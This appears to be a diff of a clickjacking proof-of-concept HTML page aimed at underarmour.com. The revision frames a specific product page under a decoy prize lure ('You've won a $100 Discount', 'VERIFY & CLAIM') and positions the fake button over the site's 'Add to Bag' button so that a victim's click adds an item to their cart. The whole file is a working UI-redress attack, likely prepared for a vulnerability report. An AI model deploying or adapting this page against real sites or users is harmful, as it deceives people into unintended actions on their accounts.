@@ -1,55 +1,34 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Privacy Violation PoC</title>
+    <title>Critical Impact: Forced Add-to-Cart</title>
     <style>
         body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
-        
-        #decoy-layer {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background: #fff;
-            z-index: 1;
-            display: flex;
-            justify-content: center;
+        #decoy { 
+            position: absolute; width: 100%; height: 100%; 
+            background: #fff; z-index: 1; text-align: center; padding-top: 150px;
         }
-
-        #fake-btn {
+        #fake-btn { 
+            padding: 20px 60px; background: #27ae60; color: white; 
+            border: none; font-size: 22px; cursor: pointer; border-radius: 10px;
             position: absolute;
-            /* Mobile screen के हिसाब से 'I ACCEPT' बटन की जगह सेट करें */
-            bottom: 20px; 
-            width: 80%;
-            padding: 15px;
-            background: #27ae60;
-            color: white;
-            border: none;
-            font-weight: bold;
-            border-radius: 5px;
-            cursor: pointer;
+            /* Inko 'Add to Bag' button ke upar set karein */
+            top: 550px; 
+            left: 50%;
+            transform: translateX(-50%);
         }
-
-        iframe {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 2;
-            opacity: 0.5; /* Alignment चेक करने के लिए 0.5 रखें */
-            border: none;
+        iframe { 
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+            z-index: 2; opacity: 0.5; border: none; 
         }
     </style>
 </head>
 <body>
-
-    <div id="decoy-layer">
-        <h2 style="margin-top: 50px;">GET 50% DISCOUNT!</h2>
-        <p>Click the button below to get your coupon code.</p>
-        <button id="fake-btn">GET DISCOUNT CODE</button>
+    <div id="decoy">
+        <h1 style="color: #27ae60;">CONGRATULATIONS!</h1>
+        <p>You've won a $100 Discount. Click below to verify your account.</p>
+        <button id="fake-btn">VERIFY & CLAIM</button>
     </div>
-
-    <iframe src="https://www.underarmour.com/en-us/"></iframe>
-
+    <iframe src="https://www.underarmour.com/en-us/p/ua_tactical_coldgear_infrared_womens_base_leggings/1365395.html"></iframe>
 </body>
 </html>
